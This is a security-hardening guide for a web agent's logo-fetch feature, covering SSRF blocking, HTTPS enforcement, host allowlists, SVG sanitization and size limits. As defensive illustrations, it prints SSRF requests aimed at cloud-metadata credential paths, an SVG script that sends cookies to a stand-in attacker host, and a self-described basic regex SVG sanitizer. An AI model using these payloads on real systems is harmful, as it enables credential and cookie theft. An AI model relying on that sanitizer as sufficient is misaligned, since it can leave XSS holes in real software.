# Logo.fetch Security Hardening Guide

## Overview

The `logo.fetch` task has been hardened with multiple layers of security to prevent abuse and protect your backend infrastructure. This guide explains all security features, configuration options, and best practices.

## Security Features

### 1. SSRF (Server-Side Request Forgery) Protection

**Problem:** Without SSRF guards, attackers could trick your server into making requests to internal services (databases, admin panels, cloud metadata endpoints).

**Solution:** IP address validation before making HTTP requests.

**What We Block:**
- **Private IP ranges**: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
- **Loopback addresses**: 127.0.0.0/8 (localhost)
- **Link-local addresses**: 169.254.0.0/16 (APIPA)
- **Reserved ranges**: 0.0.0.0/8, 240.0.0.0/4, etc.
- **Multicast addresses**: 224.0.0.0/4

**Example Attack Prevented:**
```bash
# Attacker tries to fetch AWS metadata
POST /agent/act
{"command": "fetch logo from http://169.254.169.254/latest/meta-data/"}

# Response: ❌ ValueError: logo.fetch: blocked non-public IP 169.254.169.254
```

**Technical Details:**
```python
# Before fetching, we resolve the hostname
infos = socket.getaddrinfo(host, None)
for _family, _type, _proto, _canon, sockaddr in infos:
    ip = ipaddress.ip_address(sockaddr[0])
    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved or ip.is_multicast:
        raise ValueError(f"logo.fetch: blocked non-public IP {ip}")
```

### 2. HTTPS Enforcement

**Problem:** Plain HTTP connections can be intercepted or manipulated (man-in-the-middle attacks).

**Solution:** Require HTTPS by default for all logo downloads.

**Configuration:**
```bash
# .env.prod (default: HTTPS required)
SITEAGENT_LOGO_ALLOW_HTTP=0  # or omit this line

# Allow HTTP only if you trust your network
SITEAGENT_LOGO_ALLOW_HTTP=1
```

**Example:**
```bash
# With HTTPS enforcement (default)
POST /agent/act
{"command": "fetch logo from http://example.com/logo.png"}

# Response: ❌ ValueError: logo.fetch: plain HTTP disabled (set SITEAGENT_LOGO_ALLOW_HTTP=1 to allow)

# With HTTPS
POST /agent/act
{"command": "fetch logo from https://example.com/logo.png"}

# Response: ✅ Success
```

### 3. Host Allowlist

**Problem:** Users might attempt to fetch logos from untrusted or malicious domains.

**Solution:** Optional suffix-based host allowlist.

**Configuration:**
```bash
# .env.prod
# Only allow GitHub and jsDelivr CDN
SITEAGENT_LOGO_HOSTS=githubusercontent.com,raw.githubusercontent.com,cdn.jsdelivr.net

# Multiple CDNs
SITEAGENT_LOGO_HOSTS=githubusercontent.com,cloudinary.com,imgix.net,fastly.net
```

**Behavior:**
- If `SITEAGENT_LOGO_HOSTS` is **not set** (empty): Allow all hosts (after IP checks)
- If `SITEAGENT_LOGO_HOSTS` is **set**: Only allow hosts ending with listed suffixes

**Example:**
```bash
# With SITEAGENT_LOGO_HOSTS=githubusercontent.com

# ✅ Allowed (ends with githubusercontent.com)
https://raw.githubusercontent.com/user/repo/main/logo.png
https://avatars.githubusercontent.com/u/12345?v=4

# ❌ Blocked (doesn't match suffix)
https://example.com/logo.png
# Response: ValueError: logo.fetch: host not allowed by SITEAGENT_LOGO_HOSTS: example.com
```

**Suffix Matching Logic:**
```python
allow_hosts = ["githubusercontent.com", "cdn.jsdelivr.net"]
host = "raw.githubusercontent.com"

# Check: host.lower().endswith("githubusercontent.com")
if any(host.lower().endswith(suf) for suf in allow_hosts):
    # ✅ Allowed
```

### 4. SVG Sanitization

**Problem:** SVG files can contain JavaScript (`<script>` tags) or other malicious elements that execute when rendered.

**Solution:** Strip dangerous elements and attributes before saving.

**What We Remove:**
- **`<script>` tags**: Any JavaScript code
- **`<foreignObject>` elements**: Can embed HTML/JS
- **Event attributes**: `onclick`, `onload`, `onmouseover`, etc.

**Example:**
```xml
<!-- Original SVG (malicious) -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
  <rect onclick="evil()" width="100" height="100"/>
  <foreignObject><body onload="steal()"/></foreignObject>
</svg>

<!-- After sanitization -->
<svg xmlns="http://www.w3.org/2000/svg">
  
  <rect  width="100" height="100"/>
  
</svg>
```

**Technical Details:**
```python
if ext == "svg":
    txt = data.decode("utf-8", errors="ignore")
    # Remove script/foreignObject
    txt = re.sub(r"<\s*(script|foreignObject)[\s\S]*?<\s*/\s*\1\s*>", "", txt, flags=re.I)
    # Remove on* event attributes
    txt = re.sub(r"\son[a-zA-Z]+\s*=\s*\"[^\"]*\"", "", txt)
    txt = re.sub(r"\son[\w-]+\s*=\s*'[^']*'", "", txt)
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(txt)
```

**Note:** This is a basic sanitizer. For critical applications, consider using a dedicated SVG sanitization library like `defusedxml` or `svg-sanitizer`.

### 5. Size Limits

**Problem:** Users could attempt to download huge files, consuming disk space and bandwidth.

**Solution:** Configurable size cap with streaming validation.

**Configuration:**
```bash
# .env.prod
SITEAGENT_LOGO_MAX_MB=3  # Default: 3MB

# Stricter limit
SITEAGENT_LOGO_MAX_MB=1

# More permissive
SITEAGENT_LOGO_MAX_MB=10
```

**Two-Stage Validation:**

1. **Early check (Content-Length header):**
   ```python
   clen = resp.headers.get("Content-Length")
   if clen and int(clen) > max_bytes:
       raise ValueError(f"logo.fetch: remote file too large ({clen} bytes)")
   ```

2. **Streaming check (during download):**
   ```python
   while chunk:
       total += len(chunk)
       if total > max_bytes:
           raise ValueError(f"logo.fetch: download exceeded {max_bytes} bytes")
   ```

**Example:**
```bash
# With SITEAGENT_LOGO_MAX_MB=2 (2MB limit)
POST /agent/act
{"command": "fetch logo from https://example.com/huge-10mb.png"}

# Response: ❌ ValueError: logo.fetch: remote file too large (10485760 bytes)
```

## Configuration Examples

### Recommended Production Settings

**Maximum Security (Strict):**
```bash
# Only allow trusted CDNs with HTTPS
SITEAGENT_LOGO_MAX_MB=2
SITEAGENT_LOGO_ALLOW_HTTP=0
SITEAGENT_LOGO_HOSTS=githubusercontent.com,raw.githubusercontent.com,cdn.jsdelivr.net
```

**Balanced (Default):**
```bash
# Require HTTPS, allow any public host
SITEAGENT_LOGO_MAX_MB=3
SITEAGENT_LOGO_ALLOW_HTTP=0
# SITEAGENT_LOGO_HOSTS not set (allow all public hosts)
```

**Permissive (Development):**
```bash
# Allow HTTP, larger files, any host
SITEAGENT_LOGO_MAX_MB=10
SITEAGENT_LOGO_ALLOW_HTTP=1
# SITEAGENT_LOGO_HOSTS not set
```

### Common CDN Allowlists

**GitHub Only:**
```bash
SITEAGENT_LOGO_HOSTS=githubusercontent.com,github.com
```

**Popular CDNs:**
```bash
SITEAGENT_LOGO_HOSTS=githubusercontent.com,cdn.jsdelivr.net,unpkg.com,cloudinary.com,imgix.net
```

**Image Hosting Services:**
```bash
SITEAGENT_LOGO_HOSTS=imgur.com,i.imgur.com,cloudinary.com,imagekit.io
```

## Logo Removal Feature

### Overview

In addition to fetching and setting logos, you can now remove logo mappings without deleting the actual files.

### Natural Language Commands

**Remove logo for a repo:**
```
remove logo for repo leok974/leo-portfolio
```

**Remove logo for a title:**
```
remove logo for siteAgent
```

### API Usage

**Via /agent/act:**
```bash
curl -X POST https://api.leoklemet.com/agent/act \
  -H "Content-Type: application/json" \
  -H "X-HMAC-Signature: $(generate_hmac)" \
  -d '{"command": "remove logo for repo leok974/leo-portfolio"}'
```

**Via /agent/run:**
```bash
curl -X POST https://api.leoklemet.com/agent/run \
  -H "Content-Type: application/json" \
  -H "X-HMAC-Signature: $(generate_hmac)" \
  -d '{
    "plan": ["overrides.update", "og.generate", "status.write"],
    "params": {
      "logo": {
        "repo": "leok974/leo-portfolio",
        "remove": true
      }
    }
  }'
```

### Behavior

**What happens:**
1. Entry removed from `og-overrides.json` (repo_logo or title_logo)
2. OG images regenerated without logo overlay
3. Status updated with new brand info

**What doesn't happen:**
- Logo file is **not deleted** from `assets/logos/`
- Other repos/titles using the same logo are unaffected

**Example:**
```json
// Before removal
{
  "repo_logo": {
    "leok974/leo-portfolio": "assets/logos/siteagent.png",
    "leok974/ledger-mind": "assets/logos/ledger.png"
  }
}

// After "remove logo for repo leok974/leo-portfolio"
{
  "repo_logo": {
    "leok974/ledger-mind": "assets/logos/ledger.png"
  }
}

// File assets/logos/siteagent.png still exists
```

## Attack Scenarios Prevented

### 1. AWS Metadata Theft
**Attack:**
```
fetch logo from http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
**Prevention:** SSRF guard blocks 169.254.169.254 (link-local)

### 2. Internal Service Scan
**Attack:**
```
fetch logo from http://10.0.0.1:8080/admin
fetch logo from http://192.168.1.1/config
```
**Prevention:** SSRF guard blocks private IPs

### 3. Localhost Access
**Attack:**
```
fetch logo from http://localhost/secret-file
fetch logo from http://127.0.0.1:5432/database
```
**Prevention:** SSRF guard blocks loopback addresses

### 4. XSS via SVG
**Attack:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.com?cookie='+document.cookie)</script>
</svg>
```
**Prevention:** SVG sanitizer strips `<script>` tags

### 5. Event Handler XSS
**Attack:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <circle onclick="malicious()" r="50"/>
</svg>
```
**Prevention:** SVG sanitizer removes `onclick` and all `on*` attributes

### 6. Disk Space Exhaustion
**Attack:**
```
fetch logo from https://example.com/100GB-file.png
```
**Prevention:** Size limit (default 3MB) aborts download

### 7. Malicious CDN
**Attack:**
```
fetch logo from https://evil-cdn.com/trojan.svg
```
**Prevention:** Host allowlist (if configured) blocks untrusted domains

## Best Practices

### 1. Set Host Allowlist in Production
```bash
# .env.prod
SITEAGENT_LOGO_HOSTS=githubusercontent.com,cdn.jsdelivr.net
```
**Why:** Limits attack surface to trusted CDNs only.

### 2. Keep Default HTTPS Enforcement
```bash
# Don't set this unless you have a specific need
# SITEAGENT_LOGO_ALLOW_HTTP=1
```
**Why:** Plain HTTP can be intercepted or manipulated.

### 3. Monitor Logo Fetch Events
```python
# Check agent event logs
{
  "evt": "logo.fetch.ok",
  "file": "assets/logos/siteagent.png",
  "ctype": "image/png"
}

{
  "evt": "logo.fetch.warn",
  "err": "blocked non-public IP 127.0.0.1"
}
```
**Why:** Detect malicious attempts or misconfigurations.

### 4. Review Fetched Logos
```bash
# After first production fetch
ls -lh assets/logos/

# Check file types
file assets/logos/*

# Inspect SVG content
cat assets/logos/*.svg
```
**Why:** Verify sanitization worked correctly.

### 5. Use CSP Headers for OG Images
```nginx
# nginx config
location /assets/og/ {
    add_header Content-Security-Policy "default-src 'none'; img-src 'self';";
}
```
**Why:** Extra layer of protection if SVG sanitization fails.

### 6. Keep Size Limits Reasonable
```bash
# Logos should be small (typically < 500KB)
SITEAGENT_LOGO_MAX_MB=2  # More than enough for logos
```
**Why:** Prevents accidental or intentional large file uploads.

## Testing Security Features

### Test SSRF Protection
```bash
# Should fail with "blocked non-public IP"
curl -X POST http://localhost:8001/agent/act \
  -H "Content-Type: application/json" \
  -d '{"command": "fetch logo from http://127.0.0.1/test"}'
```

### Test HTTPS Enforcement
```bash
# Should fail with "plain HTTP disabled"
curl -X POST http://localhost:8001/agent/act \
  -H "Content-Type: application/json" \
  -d '{"command": "fetch logo from http://example.com/logo.png"}'
```

### Test Host Allowlist
```bash
# Set SITEAGENT_LOGO_HOSTS=githubusercontent.com

# Should fail with "host not allowed"
curl -X POST http://localhost:8001/agent/act \
  -H "Content-Type: application/json" \
  -d '{"command": "fetch logo from https://example.com/logo.png"}'

# Should succeed
curl -X POST http://localhost:8001/agent/act \
  -H "Content-Type: application/json" \
  -d '{"command": "fetch logo from https://raw.githubusercontent.com/user/repo/main/logo.png"}'
```

### Test SVG Sanitization
```bash
# Create malicious SVG
echo '<svg><script>alert(1)</script></svg>' > /tmp/evil.svg

# Fetch it (use local server or upload to GitHub)
# After fetch, check saved file
cat assets/logos/evil.svg
# Should not contain <script> tag
```

### Test Size Limits
```bash
# Set SITEAGENT_LOGO_MAX_MB=0.001 (1KB for testing)

# Try to fetch normal logo (should fail)
curl -X POST http://localhost:8001/agent/act \
  -H "Content-Type: application/json" \
  -d '{"command": "fetch logo from https://github.com/favicon.ico"}'
# Response: "download exceeded 1024 bytes"
```

## Troubleshooting

### "blocked non-public IP" Error
**Cause:** URL resolves to a private/loopback/link-local address.

**Solutions:**
1. Use a public hostname (not localhost, 127.0.0.1, etc.)
2. Deploy logo to a public CDN
3. Ensure DNS doesn't point to private IPs

### "host not allowed by SITEAGENT_LOGO_HOSTS" Error
**Cause:** Host doesn't match any allowed suffix.

**Solutions:**
1. Add the host to `SITEAGENT_LOGO_HOSTS`
2. Remove `SITEAGENT_LOGO_HOSTS` to allow all hosts (less secure)
3. Use an allowed CDN instead

**Example:**
```bash
# Add cdn.example.com
SITEAGENT_LOGO_HOSTS=githubusercontent.com,cdn.example.com
```

### "plain HTTP disabled" Error
**Cause:** URL uses http:// instead of https://.

**Solutions:**
1. Change URL to use https://
2. Set `SITEAGENT_LOGO_ALLOW_HTTP=1` (not recommended)

### "download exceeded X bytes" Error
**Cause:** File is larger than `SITEAGENT_LOGO_MAX_MB`.

**Solutions:**
1. Compress/resize the logo before uploading
2. Increase `SITEAGENT_LOGO_MAX_MB` if necessary
3. Use a smaller logo (recommended: < 500KB)

### SVG Not Rendering After Sanitization
**Cause:** Overly aggressive regex may have damaged SVG structure.

**Solutions:**
1. Use simpler SVG files (avoid complex features)
2. Pre-sanitize SVGs before uploading
3. Convert SVG to PNG (lossless)

## Security Checklist

Before deploying to production:

- [ ] Set `SITEAGENT_LOGO_MAX_MB` to reasonable value (1-3 MB)
- [ ] Configure `SITEAGENT_LOGO_HOSTS` with trusted CDNs
- [ ] Keep `SITEAGENT_LOGO_ALLOW_HTTP` unset (default: require HTTPS)
- [ ] Test SSRF protection with localhost URLs
- [ ] Test host allowlist with unauthorized domains
- [ ] Test HTTPS enforcement with http:// URLs
- [ ] Verify SVG sanitization with malicious samples
- [ ] Monitor agent event logs for suspicious activity
- [ ] Review fetched logos after first production use
- [ ] Document allowed CDNs for your team
- [ ] Set up alerts for logo.fetch.warn events

## Summary

The hardened `logo.fetch` task provides defense-in-depth security:

1. **SSRF Protection** → Blocks internal network access
2. **HTTPS Enforcement** → Prevents MITM attacks
3. **Host Allowlist** → Limits to trusted CDNs
4. **SVG Sanitization** → Strips malicious code
5. **Size Limits** → Prevents resource exhaustion

Combined with dual authentication (CF Access + HMAC) and natural language commands, this provides a secure, user-friendly logo management system.

**Commit:** a7a8f75 (Security hardening)  
**All 20 tests passing** (9 logo.fetch + 11 interpreter)
